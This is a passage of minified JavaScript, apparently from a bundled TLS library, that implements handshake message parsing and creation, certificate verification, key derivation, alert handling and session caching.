short.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.illegal_parameter}});else{var se=G.fragment,ne=se.length();if(j={version:{major:se.getByte(),minor:se.getByte()},random:r.util.createBuffer(se.getBytes(32)),session_id:s(se,1),extensions:[]},Y?(j.cipher_suite=se.getBytes(2),j.compression_method=se.getByte()):(j.cipher_suites=s(se,2),j.compression_methods=s(se,1)),ne=Z-(ne-se.length()),ne>0){for(var Te=s(se,2);Te.length()>0;)j.extensions.push({type:[Te.getByte(),Te.getByte()],data:s(Te,2)});if(!Y)for(var Re=0;Re<j.extensions.length;++Re){var $e=j.extensions[Re];if($e.type[0]===0&&$e.type[1]===0)for(var Ae=s($e.data,2);Ae.length()>0;){var De=Ae.getByte();if(De!==0)break;U.session.extensions.server_name.serverNameList.push(s(Ae,2).getBytes())}}}if(U.session.version&&(j.version.major!==U.session.version.major||j.version.minor!==U.session.version.minor))return U.error(U,{message:"TLS version change is disallowed during renegotiation.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.protocol_version}});if(Y)U.session.cipherSuite=a.getCipherSuite(j.cipher_suite);else for(var Le=r.util.createBuffer(j.cipher_suites.bytes());Le.length()>0&&(U.session.cipherSuite=a.getCipherSuite(Le.getBytes(2)),U.session.cipherSuite===null););if(U.session.cipherSuite===null)return U.error(U,{message:"No cipher suites in common.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.handshake_failure},cipherSuite:r.util.bytesToHex(j.cipher_suite)});Y?U.session.compressionMethod=j.compression_method:U.session.compressionMethod=a.CompressionMethod.none}return j},a.createSecurityParameters=function(U,G){var Z=U.entity===a.ConnectionEnd.client,j=G.random.bytes(),Y=Z?U.session.sp.client_random:j,se=Z?j:a.createRandom().getBytes();U.session.sp={entity:U.entity,prf_algorithm:a.PRFAlgorithm.tls_prf_sha256,bulk_cipher_algorithm:null,cipher_type:null,enc_key_length:null,block_length:null,fixed_iv_length:null,record_iv_length:null,mac_algorithm:null,mac_length:null,mac_key_length:null,compression_algorithm:U.session.compressionMethod,pre_master_secret:null,master_secret:null,client_random:Y,server_random:se}},a.handleServerHello=function(U,G,Z){var j=a.parseHelloMessage(U,G,Z);if(!U.fail){if(j.version.minor<=U.version.minor)U.version.minor=j.version.minor;else return U.error(U,{message:"Incompatible TLS version.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.protocol_version}});U.session.version=U.version;var Y=j.session_id.bytes();Y.length>0&&Y===U.session.id?(U.expect=f,U.session.resuming=!0,U.session.sp.server_random=j.random.bytes()):(U.expect=l,U.session.resuming=!1,a.createSecurityParameters(U,j)),U.session.id=Y,U.process()}},a.handleClientHello=function(U,G,Z){var j=a.parseHelloMessage(U,G,Z);if(!U.fail){var Y=j.session_id.bytes(),se=null;if(U.sessionCache&&(se=U.sessionCache.getSession(Y),se===null?Y="":(se.version.major!==j.version.major||se.version.minor>j.version.minor)&&(se=null,Y="")),Y.length===0&&(Y=r.random.getBytes(32)),U.session.id=Y,U.session.clientHelloVersion=j.version,U.session.sp={},se)U.version=U.session.version=se.version,U.session.sp=se.sp;else{for(var ne,Te=1;Te<a.SupportedVersions.length&&(ne=a.SupportedVersions[Te],!(ne.minor<=j.version.minor));++Te);U.version={major:ne.major,minor:ne.minor},U.session.version=U.version}se!==null?(U.expect=k,U.session.resuming=!0,U.session.sp.client_random=j.random.bytes()):(U.expect=U.verifyClient!==!1?x:S,U.session.resuming=!1,a.createSecurityParameters(U,j)),U.open=!0,a.queue(U,a.createRecord(U,{type:a.ContentType.handshake,data:a.createServerHello(U)})),U.session.resuming?(a.queue(U,a.createRecord(U,{type:a.ContentType.change_cipher_spec,data:a.createChangeCipherSpec()})),U.state.pending=a.createConnectionState(U),U.state.current.write=U.state.pending.write,a.queue(U,a.createRecord(U,{type:a.ContentType.handshake,data:a.createFinished(U)}))):(a.queue(U,a.createRecord(U,{type:a.ContentType.handshake,data:a.createCertificate(U)})),U.fail||(a.queue(U,a.createRecord(U,{type:a.ContentType.handshake,data:a.createServerKeyExchange(U)})),U.verifyClient!==!1&&a.queue(U,a.createRecord(U,{type:a.ContentType.handshake,data:a.createCertificateRequest(U)})),a.queue(U,a.createRecord(U,{type:a.ContentType.handshake,data:a.createServerHelloDone(U)})))),a.flush(U),U.process()}},a.handleCertificate=function(U,G,Z){if(Z<3)return U.error(U,{message:"Invalid Certificate message. Message too short.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.illegal_parameter}});var j=G.fragment,Y={certificate_list:s(j,3)},se,ne,Te=[];try{for(;Y.certificate_list.length()>0;)se=s(Y.certificate_list,3),ne=r.asn1.fromDer(se),se=r.pki.certificateFromAsn1(ne,!0),Te.push(se)}catch($e){return U.error(U,{message:"Could not parse certificate list.",cause:$e,send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.bad_certificate}})}var Re=U.entity===a.ConnectionEnd.client;(Re||U.verifyClient===!0)&&Te.length===0?U.error(U,{message:Re?"No server certificate provided.":"No client certificate provided.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.illegal_parameter}}):Te.length===0?U.expect=Re?u:S:(Re?U.session.serverCertificate=Te[0]:U.session.clientCertificate=Te[0],a.verifyCertificateChain(U,Te)&&(U.expect=Re?u:S)),U.process()},a.handleServerKeyExchange=function(U,G,Z){if(Z>0)return U.error(U,{message:"Invalid key parameters. Only RSA is supported.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.unsupported_certificate}});U.expect=d,U.process()},a.handleClientKeyExchange=function(U,G,Z){if(Z<48)return U.error(U,{message:"Invalid key parameters. Only RSA is supported.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.unsupported_certificate}});var j=G.fragment,Y={enc_pre_master_secret:s(j,2).getBytes()},se=null;if(U.getPrivateKey)try{se=U.getPrivateKey(U,U.session.serverCertificate),se=r.pki.privateKeyFromPem(se)}catch(Re){U.error(U,{message:"Could not get private key.",cause:Re,send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.internal_error}})}if(se===null)return U.error(U,{message:"No private key set.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.internal_error}});try{var ne=U.session.sp;ne.pre_master_secret=se.decrypt(Y.enc_pre_master_secret);var Te=U.session.clientHelloVersion;if(Te.major!==ne.pre_master_secret.charCodeAt(0)||Te.minor!==ne.pre_master_secret.charCodeAt(1))throw new Error("TLS version rollback attack detected.")}catch{ne.pre_master_secret=r.random.getBytes(48)}U.expect=k,U.session.clientCertificate!==null&&(U.expect=T),U.process()},a.handleCertificateRequest=function(U,G,Z){if(Z<3)return U.error(U,{message:"Invalid CertificateRequest. Message too short.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.illegal_parameter}});var j=G.fragment,Y={certificate_types:s(j,1),certificate_authorities:s(j,2)};U.session.certificateRequest=Y,U.expect=h,U.process()},a.handleCertificateVerify=function(U,G,Z){if(Z<2)return U.error(U,{message:"Invalid CertificateVerify. Message too short.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.illegal_parameter}});var j=G.fragment;j.read-=4;var Y=j.bytes();j.read+=4;var se={signature:s(j,2).getBytes()},ne=r.util.createBuffer();ne.putBuffer(U.session.md5.digest()),ne.putBuffer(U.session.sha1.digest()),ne=ne.getBytes();try{var Te=U.session.clientCertificate;if(!Te.publicKey.verify(ne,se.signature,"NONE"))throw new Error("CertificateVerify signature does not match.");U.session.md5.update(Y),U.session.sha1.update(Y)}catch{return U.error(U,{message:"Bad signature in CertificateVerify.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.handshake_failure}})}U.expect=k,U.process()},a.handleServerHelloDone=function(U,G,Z){if(Z>0)return U.error(U,{message:"Invalid ServerHelloDone message. Invalid length.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.record_overflow}});if(U.serverCertificate===null){var j={message:"No server certificate provided. Not enough security.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.insufficient_security}},Y=0,se=U.verify(U,j.alert.description,Y,[]);if(se!==!0)return(se||se===0)&&(typeof se=="object"&&!r.util.isArray(se)?(se.message&&(j.message=se.message),se.alert&&(j.alert.description=se.alert)):typeof se=="number"&&(j.alert.description=se)),U.error(U,j)}U.session.certificateRequest!==null&&(G=a.createRecord(U,{type:a.ContentType.handshake,data:a.createCertificate(U)}),a.queue(U,G)),G=a.createRecord(U,{type:a.ContentType.handshake,data:a.createClientKeyExchange(U)}),a.queue(U,G),U.expect=w;var ne=function(Te,Re){Te.session.certificateRequest!==null&&Te.session.clientCertificate!==null&&a.queue(Te,a.createRecord(Te,{type:a.ContentType.handshake,data:a.createCertificateVerify(Te,Re)})),a.queue(Te,a.createRecord(Te,{type:a.ContentType.change_cipher_spec,data:a.createChangeCipherSpec()})),Te.state.pending=a.createConnectionState(Te),Te.state.current.write=Te.state.pending.write,a.queue(Te,a.createRecord(Te,{type:a.ContentType.handshake,data:a.createFinished(Te)})),Te.expect=f,a.flush(Te),Te.process()};if(U.session.certificateRequest===null||U.session.clientCertificate===null)return ne(U,null);a.getClientSignature(U,ne)},a.handleChangeCipherSpec=function(U,G){if(G.fragment.getByte()!==1)return U.error(U,{message:"Invalid ChangeCipherSpec message received.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.illegal_parameter}});var Z=U.entity===a.ConnectionEnd.client;(U.session.resuming&&Z||!U.session.resuming&&!Z)&&(U.state.pending=a.createConnectionState(U)),U.state.current.read=U.state.pending.read,(!U.session.resuming&&Z||U.session.resuming&&!Z)&&(U.state.pending=null),U.expect=Z?p:I,U.process()},a.handleFinished=function(U,G,Z){var j=G.fragment;j.read-=4;var Y=j.bytes();j.read+=4;var se=G.fragment.getBytes();j=r.util.createBuffer(),j.putBuffer(U.session.md5.digest()),j.putBuffer(U.session.sha1.digest());var ne=U.entity===a.ConnectionEnd.client,Te=ne?"server finished":"client finished",Re=U.session.sp,$e=12,Ae=e;if(j=Ae(Re.master_secret,Te,j.getBytes(),$e),j.getBytes()!==se)return U.error(U,{message:"Invalid verify_data in Finished message.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.decrypt_error}});U.session.md5.update(Y),U.session.sha1.update(Y),(U.session.resuming&&ne||!U.session.resuming&&!ne)&&(a.queue(U,a.createRecord(U,{type:a.ContentType.change_cipher_spec,data:a.createChangeCipherSpec()})),U.state.current.write=U.state.pending.write,U.state.pending=null,a.queue(U,a.createRecord(U,{type:a.ContentType.handshake,data:a.createFinished(U)}))),U.expect=ne?g:E,U.handshaking=!1,++U.handshakes,U.peerCertificate=ne?U.session.serverCertificate:U.session.clientCertificate,a.flush(U),U.isConnected=!0,U.connected(U),U.process()},a.handleAlert=function(U,G){var Z=G.fragment,j={level:Z.getByte(),description:Z.getByte()},Y;switch(j.description){case a.Alert.Description.close_notify:Y="Connection closed.";break;case a.Alert.Description.unexpected_message:Y="Unexpected message.";break;case a.Alert.Description.bad_record_mac:Y="Bad record MAC.";break;case a.Alert.Description.decryption_failed:Y="Decryption failed.";break;case a.Alert.Description.record_overflow:Y="Record overflow.";break;case a.Alert.Description.decompression_failure:Y="Decompression failed.";break;case a.Alert.Description.handshake_failure:Y="Handshake failure.";break;case a.Alert.Description.bad_certificate:Y="Bad certificate.";break;case a.Alert.Description.unsupported_certificate:Y="Unsupported certificate.";break;case a.Alert.Description.certificate_revoked:Y="Certificate revoked.";break;case a.Alert.Description.certificate_expired:Y="Certificate expired.";break;case a.Alert.Description.certificate_unknown:Y="Certificate unknown.";break;case a.Alert.Description.illegal_parameter:Y="Illegal parameter.";break;case a.Alert.Description.unknown_ca:Y="Unknown certificate authority.";break;case a.Alert.Description.access_denied:Y="Access denied.";break;case a.Alert.Description.decode_error:Y="Decode error.";break;case a.Alert.Description.decrypt_error:Y="Decrypt error.";break;case a.Alert.Description.export_restriction:Y="Export restriction.";break;case a.Alert.Description.protocol_version:Y="Unsupported protocol version.";break;case a.Alert.Description.insufficient_security:Y="Insufficient security.";break;case a.Alert.Description.internal_error:Y="Internal error.";break;case a.Alert.Description.user_canceled:Y="User canceled.";break;case a.Alert.Description.no_renegotiation:Y="Renegotiation not supported.";break;default:Y="Unknown error.";break}if(j.description===a.Alert.Description.close_notify)return U.close();U.error(U,{message:Y,send:!1,origin:U.entity===a.ConnectionEnd.client?"server":"client",alert:j}),U.process()},a.handleHandshake=function(U,G){var Z=G.fragment,j=Z.getByte(),Y=Z.getInt24();if(Y>Z.length())return U.fragmented=G,G.fragment=r.util.createBuffer(),Z.read-=4,U.process();U.fragmented=null,Z.read-=4;var se=Z.bytes(Y+4);Z.read+=4,j in M[U.entity][U.expect]?(U.entity===a.ConnectionEnd.server&&!U.open&&!U.fail&&(U.handshaking=!0,U.session={version:null,extensions:{server_name:{serverNameList:[]}},cipherSuite:null,compressionMethod:null,serverCertificate:null,clientCertificate:null,md5:r.md.md5.create(),sha1:r.md.sha1.create()}),j!==a.HandshakeType.hello_request&&j!==a.HandshakeType.certificate_verify&&j!==a.HandshakeType.finished&&(U.session.md5.update(se),U.session.sha1.update(se)),M[U.entity][U.expect][j](U,G,Y)):a.handleUnexpected(U,G)},a.handleApplicationData=function(U,G){U.data.putBuffer(G.fragment),U.dataReady(U),U.process()},a.handleHeartbeat=function(U,G){var Z=G.fragment,j=Z.getByte(),Y=Z.getInt16(),se=Z.getBytes(Y);if(j===a.HeartbeatMessageType.heartbeat_request){if(U.handshaking||Y>se.length)return U.process();a.queue(U,a.createRecord(U,{type:a.ContentType.heartbeat,data:a.createHeartbeat(a.HeartbeatMessageType.heartbeat_response,se)})),a.flush(U)}else if(j===a.HeartbeatMessageType.heartbeat_response){if(se!==U.expectedHeartbeatPayload)return U.process();U.heartbeatReceived&&U.heartbeatReceived(U,r.util.createBuffer(se))}U.process()};var c=0,l=1,u=2,d=3,h=4,f=5,p=6,g=7,w=8,m=0,x=1,S=2,T=3,k=4,I=5,E=6,C=a.handleUnexpected,N=a.handleChangeCipherSpec,L=a.handleAlert,$=a.handleHandshake,y=a.handleApplicationData,A=a.handleHeartbeat,b=[];b[a.ConnectionEnd.client]=[[C,L,$,C,A],[C,L,$,C,A],[C,L,$,C,A],[C,L,$,C,A],[C,L,$,C,A],[N,L,C,C,A],[C,L,$,C,A],[C,L,$,y,A],[C,L,$,C,A]],b[a.ConnectionEnd.server]=[[C,L,$,C,A],[C,L,$,C,A],[C,L,$,C,A],[C,L,$,C,A],[N,L,C,C,A],[C,L,$,C,A],[C,L,$,y,A],[C,L,$,C,A]];var v=a.handleHelloRequest,_=a.handleServerHello,O=a.handleCertificate,D=a.handleServerKeyExchange,R=a.handleCertificateRequest,P=a.handleServerHelloDone,B=a.handleFinished,M=[];M[a.ConnectionEnd.client]=[[C,C,_,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C],[v,C,C,C,C,C,C,C,C,C,C,O,D,R,P,C,C,C,C,C,C],[v,C,C,C,C,C,C,C,C,C,C,C,D,R,P,C,C,C,C,C,C],[v,C,C,C,C,C,C,C,C,C,C,C,C,R,P,C,C,C,C,C,C],[v,C,C,C,C,C,C,C,C,C,C,C,C,C,P,C,C,C,C,C,C],[v,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C],[v,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,B],[v,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C],[v,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C]];var W=a.handleClientHello,K=a.handleClientKeyExchange,q=a.handleCertificateVerify;M[a.ConnectionEnd.server]=[[C,W,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C],[C,C,C,C,C,C,C,C,C,C,C,O,C,C,C,C,C,C,C,C,C],[C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,K,C,C,C,C],[C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,q,C,C,C,C,C],[C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C],[C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,B],[C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C],[C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C,C]],a.generateKeys=function(U,G){var Z=e,j=G.client_random+G.server_random;U.session.resuming||(G.master_secret=Z(G.pre_master_secret,"master secret",j,48).bytes(),G.pre_master_secret=null),j=G.server_random+G.client_random;var Y=2*G.mac_key_length+2*G.enc_key_length,se=U.version.major===a.Versions.TLS_1_0.major&&U.version.minor===a.Versions.TLS_1_0.minor;se&&(Y+=2*G.fixed_iv_length);var ne=Z(G.master_secret,"key expansion",j,Y),Te={client_write_MAC_key:ne.getBytes(G.mac_key_length),server_write_MAC_key:ne.getBytes(G.mac_key_length),client_write_key:ne.getBytes(G.enc_key_length),server_write_key:ne.getBytes(G.enc_key_length)};return se&&(Te.client_write_IV=ne.getBytes(G.fixed_iv_length),Te.server_write_IV=ne.getBytes(G.fixed_iv_length)),Te},a.createConnectionState=function(U){var G=U.entity===a.ConnectionEnd.client,Z=function(){var se={sequenceNumber:[0,0],macKey:null,macLength:0,macFunction:null,cipherState:null,cipherFunction:function(ne){return!0},compressionState:null,compressFunction:function(ne){return!0},updateSequenceNumber:function(){se.sequenceNumber[1]===4294967295?(se.sequenceNumber[1]=0,++se.sequenceNumber[0]):++se.sequenceNumber[1]}};return se},j={read:Z(),write:Z()};if(j.read.update=function(se,ne){return j.read.cipherFunction(ne,j.read)?j.read.compressFunction(se,ne,j.read)||se.error(se,{message:"Could not decompress record.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.decompression_failure}}):se.error(se,{message:"Could not decrypt record or bad MAC.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.bad_record_mac}}),!se.fail},j.write.update=function(se,ne){return j.write.compressFunction(se,ne,j.write)?j.write.cipherFunction(ne,j.write)||se.error(se,{message:"Could not encrypt record.",send:!1,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.internal_error}}):se.error(se,{message:"Could not compress record.",send:!1,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.internal_error}}),!se.fail},U.session){var Y=U.session.sp;switch(U.session.cipherSuite.initSecurityParameters(Y),Y.keys=a.generateKeys(U,Y),j.read.macKey=G?Y.keys.server_write_MAC_key:Y.keys.client_write_MAC_key,j.write.macKey=G?Y.keys.client_write_MAC_key:Y.keys.server_write_MAC_key,U.session.cipherSuite.initConnectionState(j,U,Y),Y.compression_algorithm){case a.CompressionMethod.none:break;case a.CompressionMethod.deflate:j.read.compressFunction=n,j.write.compressFunction=i;break;default:throw new Error("Unsupported compression algorithm.")}}return j},a.createRandom=function(){var U=new Date,G=+U+U.getTimezoneOffset()*6e4,Z=r.util.createBuffer();return Z.putInt32(G),Z.putBytes(r.random.getBytes(28)),Z},a.createRecord=function(U,G){if(!G.data)return null;var Z={type:G.type,version:{major:U.version.major,minor:U.version.minor},length:G.data.length(),fragment:G.data};return Z},a.createAlert=function(U,G){var Z=r.util.createBuffer();return Z.putByte(G.level),Z.putByte(G.description),a.createRecord(U,{type:a.ContentType.alert,data:Z})},a.createClientHello=function(U){U.session.clientHelloVersion={major:U.version.major,minor:U.version.minor};for(var G=r.util.createBuffer(),Z=0;Z<U.cipherSuites.length;++Z){var j=U.cipherSuites[Z];G.putByte(j.id[0]),G.putByte(j.id[1])}var Y=G.length(),se=r.util.createBuffer();se.putByte(a.CompressionMethod.none);var ne=se.length(),Te=r.util.createBuffer();if(U.virtualHost){var Re=r.util.createBuffer();Re.putByte(0),Re.putByte(0);var $e=r.util.createBuffer();$e.putByte(0),o($e,2,r.util.createBuffer(U.virtualHost));var Ae=r.util.createBuffer();o(Ae,2,$e),o(Re,2,Ae),Te.putBuffer(Re)}var De=Te.length();De>0&&(De+=2);var Le=U.session.id,it=Le.length+1+2+4+28+2+Y+1+ne+De,nt=r.util.createBuffer();return nt.putByte(a.HandshakeType.client_hello),nt.putInt24(it),nt.putByte(U.version.major),nt.putByte(U.version.minor),nt.putBytes(U.session.sp.client_random),o(nt,1,r.util.createBuffer(Le)),o(nt,2,G),o(nt,1,se),De>0&&o(nt,2,Te),nt},a.createServerHello=function(U){var G=U.session.id,Z=G.length+1+2+4+28+2+1,j=r.util.createBuffer();return j.putByte(a.HandshakeType.server_hello),j.putInt24(Z),j.putByte(U.version.major),j.putByte(U.version.minor),j.putBytes(U.session.sp.server_random),o(j,1,r.util.createBuffer(G)),j.putByte(U.session.cipherSuite.id[0]),j.putByte(U.session.cipherSuite.id[1]),j.putByte(U.session.compressionMethod),j},a.createCertificate=function(U){var G=U.entity===a.ConnectionEnd.client,Z=null;if(U.getCertificate){var j;G?j=U.session.certificateRequest:j=U.session.extensions.server_name.serverNameList,Z=U.getCertificate(U,j)}var Y=r.util.createBuffer();if(Z!==null)try{r.util.isArray(Z)||(Z=[Z]);for(var se=null,ne=0;ne<Z.length;++ne){var Te=r.pem.decode(Z[ne])[0];if(Te.type!=="CERTIFICATE"&&Te.type!=="X509 CERTIFICATE"&&Te.type!=="TRUSTED CERTIFICATE"){var Re=new Error('Could not convert certificate from PEM; PEM header type is not "CERTIFICATE", "X509 CERTIFICATE", or "TRUSTED CERTIFICATE".');throw Re.headerType=Te.type,Re}if(Te.procType&&Te.procType.type==="ENCRYPTED")throw new Error("Could not convert certificate from PEM; PEM is encrypted.");var $e=r.util.createBuffer(Te.body);se===null&&(se=r.asn1.fromDer($e.bytes(),!1));var Ae=r.util.createBuffer();o(Ae,3,$e),Y.putBuffer(Ae)}Z=r.pki.certificateFromAsn1(se),G?U.session.clientCertificate=Z:U.session.serverCertificate=Z}catch(it){return U.error(U,{message:"Could not send certificate list.",cause:it,send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.bad_certificate}})}var De=3+Y.length(),Le=r.util.createBuffer();return Le.putByte(a.HandshakeType.certificate),Le.putInt24(De),o(Le,3,Y),Le},a.createClientKeyExchange=function(U){var G=r.util.createBuffer();G.putByte(U.session.clientHelloVersion.major),G.putByte(U.session.clientHelloVersion.minor),G.putBytes(r.random.getBytes(46));var Z=U.session.sp;Z.pre_master_secret=G.getBytes();var j=U.session.serverCertificate.publicKey;G=j.encrypt(Z.pre_master_secret);var Y=G.length+2,se=r.util.createBuffer();return se.putByte(a.HandshakeType.client_key_exchange),se.putInt24(Y),se.putInt16(G.length),se.putBytes(G),se},a.createServerKeyExchange=function(U){var G=r.util.createBuffer();return G},a.getClientSignature=function(U,G){var Z=r.util.createBuffer();Z.putBuffer(U.session.md5.digest()),Z.putBuffer(U.session.sha1.digest()),Z=Z.getBytes(),U.getSignature=U.getSignature||function(j,Y,se){var ne=null;if(j.getPrivateKey)try{ne=j.getPrivateKey(j,j.session.clientCertificate),ne=r.pki.privateKeyFromPem(ne)}catch(Te){j.error(j,{message:"Could not get private key.",cause:Te,send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.internal_error}})}ne===null?j.error(j,{message:"No private key set.",send:!0,alert:{level:a.Alert.Level.fatal,description:a.Alert.Description.internal_error}}):Y=ne.sign(Y,null),se(j,Y)},U.getSignature(U,Z,G)},a.createCertificateVerify=function(U,G){var Z=G.length+2,j=r.util.createBuffer();return j.putByte(a.HandshakeType.certificate_verify),j.putInt24(Z),j.putInt16(G.length),j.putBytes(G),j},a.createCertificateRequest=function(U){var G=r.util.createBuffer();G.putByte(1);var Z=r.util.createBuffer();for(var j in U.caStore.certs){var Y=U.caStore.certs[j],se=r.pki.distinguishedNameToAsn1(Y.subject),ne=r.asn1.toDer(se);Z.putInt16(ne.length()),Z.putBuffer(ne)}var Te=1+G.length()+2+Z.length(),Re=r.util.createBuffer();return Re.putByte(a.HandshakeType.certificate_request),Re.putInt24(Te),o(Re,1,G),o(Re,2,Z),Re},a.createServerHelloDone=function(U){var G=r.util.createBuffer();return G.putByte(a.HandshakeType.server_hello_done),G.putInt24(0),G},a.createChangeCipherSpec=function(){var U=r.util.createBuffer();return U.putByte(1),U},a.createFinished=function(U){var G=r.util.createBuffer();G.putBuffer(U.session.md5.digest()),G.putBuffer(U.session.sha1.digest());var Z=U.entity===a.ConnectionEnd.client,j=U.session.sp,Y=12,se=e,ne=Z?"client finished":"server finished";G=se(j.master_secret,ne,G.getBytes(),Y);var Te=r.util.createBuffer();return Te.putByte(a.HandshakeType.finished),Te.putInt24(G.length()),Te.putBuffer(G),Te},a.createHeartbeat=function(U,G,Z){typeof Z>"u"&&(Z=G.length);var j=r.util.createBuffer();j.putByte(U),j.putInt16(Z),j.putBytes(G);var Y=j.length(),se=Math.max(16,Y-Z-3);return j.putBytes(r.random.getBytes(se)),j},a.queue=function(U,G){if(G&&!(G.fragment.length()===0&&(G.type===a.ContentType.handshake||G.type===a.ContentType.alert||G.type===a.ContentType.change_cipher_spec))){if(G.type===a.ContentType.handshake){var Z=G.fragment.bytes();U.session.md5.update(Z),U.session.sha1.update(Z),Z=null}var j;if(G.fragment.length()<=a.MaxFragment)j=[G];else{j=[];for(var Y=G.fragment.bytes();Y.length>a.MaxFragment;)j.push(a.createRecord(U,{type:G.type,data:r.util.createBuffer(Y.slice(0,a.MaxFragment))})),Y=Y.slice(a.MaxFragment);Y.length>0&&j.push(a.createRecord(U,{type:G.type,data:r.util.createBuffer(Y)}))}for(var se=0;se<j.length&&!U.fail;++se){var ne=j[se],Te=U.state.current.write;Te.update(U,ne)&&U.records.push(ne)}}},a.flush=function(U){for(var G=0;G<U.records.length;++G){var Z=U.records[G];U.tlsData.putByte(Z.type),U.tlsData.putByte(Z.version.major),U.tlsData.putByte(Z.version.minor),U.tlsData.putInt16(Z.fragment.length()),U.tlsData.putBuffer(U.records[G].fragment)}return U.records=[],U.tlsDataReady(U)};var J=function(U){switch(U){case!0:return!0;case r.pki.certificateError.bad_certificate:return a.Alert.Description.bad_certificate;case r.pki.certificateError.unsupported_certificate:return a.Alert.Description.unsupported_certificate;case r.pki.certificateError.certificate_revoked:return a.Alert.Description.certificate_revoked;case r.pki.certificateError.certificate_expired:return a.Alert.Description.certificate_expired;case r.pki.certificateError.certificate_unknown:return a.Alert.Description.certificate_unknown;case r.pki.certificateError.unknown_ca:return a.Alert.Description.unknown_ca;default:return a.Alert.Description.bad_certificate}},le=function(U){switch(U){case!0:return!0;case a.Alert.Description.bad_certificate:return r.pki.certificateError.bad_certificate;case a.Alert.Description.unsupported_certificate:return r.pki.certificateError.unsupported_certificate;case a.Alert.Description.certificate_revoked:return r.pki.certificateError.certificate_revoked;case a.Alert.Description.certificate_expired:return r.pki.certificateError.certificate_expired;case a.Alert.Description.certificate_unknown:return r.pki.certificateError.certificate_unknown;case a.Alert.Description.unknown_ca:return r.pki.certificateError.unknown_ca;default:return r.pki.certificateError.bad_certificate}};a.verifyCertificateChain=function(U,G){try{var Z={};for(var j in U.verifyOptions)Z[j]=U.verifyOptions[j];Z.verify=function(se,ne,Te){var Re=J(se),$e=U.verify(U,se,ne,Te);if($e!==!0){if(typeof $e=="object"&&!r.util.isArray($e)){var Ae=new Error("The application rejected the certificate.");throw Ae.send=!0,Ae.alert={level:a.Alert.Level.fatal,description:a.Alert.Description.bad_certificate},$e.message&&(Ae.message=$e.message),$e.alert&&(Ae.alert.description=$e.alert),Ae}$e!==se&&($e=le($e))}return $e},r.pki.verifyCertificateChain(U.caStore,G,Z)}catch(se){var Y=se;(typeof Y!="object"||r.util.isArray(Y))&&(Y={send:!0,alert:{level:a.Alert.Level.fatal,description:J(se)}}),"send"in Y||(Y.send=!0),"alert"in Y||(Y.alert={level:a.Alert.Level.fatal,description:J(Y.error)}),U.error(U,Y)}return!U.fail},a.createSessionCache=function(U,G){var Z=null;if(U&&U.getSession&&U.setSession&&U.order)Z=U;else{Z={},Z.cache=U||{},Z.capacity=Math.max(G||100,1),Z.order=[];for(var j in U)Z.order.length<=G?Z.order.push(j):delete U[j];Z.getSession=function(Y){var se=null,ne=null;if(Y?ne=r.util.bytesToHex(Y):Z.order.length>0&&(ne=Z.order[0]),ne!==null&&ne in Z.cache){se=Z.cache[ne],delete Z.cache[ne];for(var Te in Z.order)if(Z.order[Te]===ne){Z.order.splice(Te,1);break}}return se},Z.setSession=function(Y,se){if(Z.order.length===Z.capacity){var ne=Z.order.shift();delete Z.cache[ne]}var ne=r.util.bytesToHex(Y);Z.order.push(ne),Z.cache[ne]=se}}return Z},a.createConnection=function(U){var G=null;U.caStore?r.util.isArray(U.caStore)?G=r.pki.createCaStore(U.caStore):G=U.caStore:G=r.pki.createCaStore();var Z=U.cipherSuites||null;if(Z===null){Z=[];for(var j in a.CipherSuites)Z.push(a.CipherSuites[j])}var Y=U.server?a.ConnectionEnd.server:a.ConnectionEnd.client,se=U.sessionCache?a.createSessionCache(U.sessionCache):null,ne={version:{major:a.Version.major,minor:a.Version.minor},entity:Y,sessionId:U.sessionId,caStore:G,sessionCache:se,cipherSuites:Z,connected:U.connected,virtualHost:U.virtualHost||null,verifyClient:U.verifyClient||!1,verify:U.verify||function(Ae,De,Le,it){return 